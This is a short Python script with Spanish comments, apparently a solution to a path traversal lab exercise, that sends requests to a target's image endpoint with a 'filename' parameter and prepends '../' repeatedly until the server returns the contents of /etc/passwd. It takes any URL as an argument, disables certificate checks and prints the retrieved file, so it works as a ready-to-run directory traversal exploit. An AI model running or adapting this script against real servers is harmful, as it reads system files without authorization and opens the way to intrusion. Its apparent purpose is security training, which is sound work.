#Laboratorio #1: Path Traversal - Caso simple

#Objetivo: Recuperar el contenido del archivo etc/passwd

# Análisis:

# Supuestos:

# La imagen probablemente se encuentra en la carpeta /var/www/images/img.jpg


# Resolucion conceptual:
# Si hacemos /var/www/images/etc/passwd, el servidor web no podrá encontrar el archivo, ya que no existe en la carpeta /var/www/images, por lo que utilizaremos ../ para ir retrociendo en el árbol de directorios.

import sys
import requests
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = { 'http':'http://127.0.0.1:8080', 'https':'http://127.0.0.1:8080' }

def peticion(url, payload):
    image_url = f"{url}/image?filename={payload}"
    r = requests.get(image_url, verify=False, proxies=proxies)
    return r

def directory_traversal_exploit(url):
    payload = "etc/passwd"
    while True:
        print(payload)
        r = peticion(url, payload)
        if r.status_code // 100 == 2:
            if "root:x" in r.text:
                print("[+] La vulnerabilidad Directory Traversal ha sido explotada con éxito")
                print("[+] Contenido del archivo /etc/passwd:")
                print(r.text)
                break
            else:
                print("[-] La vulnerabilidad Directory Traversal no ha sido explotada con éxito")
                print("[-] El archivo /etc/passwd no ha sido encontrado")
                sys.exit(-1)
        else:
            print(f"El código de estado de la petición es: {r.status_code}")
        payload = "../" + payload

def main():
    if len(sys.argv) != 2:
        print("[+] Uso: %s <url>" % sys.argv[0])
        print("[+] Ejemplo: %s www.misitio.com" % sys.argv[0])
        sys.exit(-1)
    url = sys.argv[1]
    print("[+] Explotando la vulnerabilidad Directory Traversal")
    directory_traversal_exploit(url)

if __name__ == "__main__":
    main()